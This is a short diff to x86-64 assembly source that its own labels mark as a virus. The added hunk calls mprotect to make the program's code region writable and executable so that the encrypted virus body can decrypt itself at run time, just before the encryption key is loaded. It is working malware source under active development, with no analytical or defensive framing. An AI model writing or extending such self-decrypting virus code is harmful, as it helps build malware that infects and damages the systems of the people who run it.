@@ -57,6 +57,30 @@ _start:
     add rax, r15                ; rax = r15 + offset = buffer address
     mov rdi, rax
     
+    ; Make .text section writable using mprotect
+    ; mprotect(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC)
+    ; We need to align addr to page boundary (4096 bytes)
+    push rdi                    ; Save buffer address
+    push rsi                    ; Save size
+    
+    ; Align address down to page boundary
+    mov rax, rdi
+    and rax, ~0xfff             ; Clear lower 12 bits (4K alignment)
+    mov rdi, rax                ; rdi = aligned address
+    
+    ; Calculate size to cover the encrypted region
+    pop rax                     ; Get size back
+    add rax, 0x1000             ; Add one page to ensure we cover everything
+    mov rsi, rax                ; rsi = size
+    
+    ; Set permissions: PROT_READ | PROT_WRITE | PROT_EXEC = 1 | 2 | 4 = 7
+    mov edx, 7
+    mov eax, SYS_MPROTECT
+    syscall
+    
+    pop rdi                     ; Restore buffer address
+    mov rsi, [r15 + encrypted_size - virus_start]  ; Restore size
+    
     ; Get encryption key
     lea rdx, [r15 + encryption_key - virus_start]
     mov rcx, 16                 ; key size
